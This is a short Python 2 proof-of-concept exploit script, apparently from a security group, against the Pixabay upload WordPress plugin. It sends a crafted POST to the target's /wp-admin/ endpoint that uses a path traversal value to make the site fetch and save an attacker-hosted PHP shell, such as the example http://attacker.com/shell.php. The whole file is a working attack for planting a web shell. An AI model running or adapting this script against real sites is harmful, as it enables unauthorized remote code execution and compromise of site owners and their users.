import argparse
import httplib, urllib
from urlparse import urlparse
 
def exploit(target_url, shellcode_url):
    target = urlparse(target_url)
    params = urllib.urlencode({'pixabay_upload': 1, 'image_url': shellcode_url,'image_user': 'none', 'q':'xxx/../../../../../../mogwai'})
    headers = headers = {"Content-type": "application/x-www-form-urlencoded"}
 
    print "[+] Sending download request...."
    conn = httplib.HTTPConnection(target.netloc)
    conn.request("POST", target.path + "/wp-admin/", params, headers)
 
    response = conn.getresponse()
    response_data = response.read()
    if response.status != 200 and response_data != "Error: File attachment metadata error":
        print "[-] Something went wrong"
    print response_data
    exit()
 
    conn.close()
 
 
# ---- Main code ----------------
parser = argparse.ArgumentParser()
parser.add_argument("target_url", help="The target url, for examplehttp://foo.bar/blog/")
parser.add_argument("shellcode_url", help="The url of the PHP file that should be uploaded, for example: http://attacker.com/shell.php")
 
print "----------------------------------------------"
print " pixabay upload wordpress plugin exploit PoC"
print " Mogwai security"
print "----------------------------------------------"
 
arguments = parser.parse_args()
exploit(arguments.target_url, arguments.shellcode_url)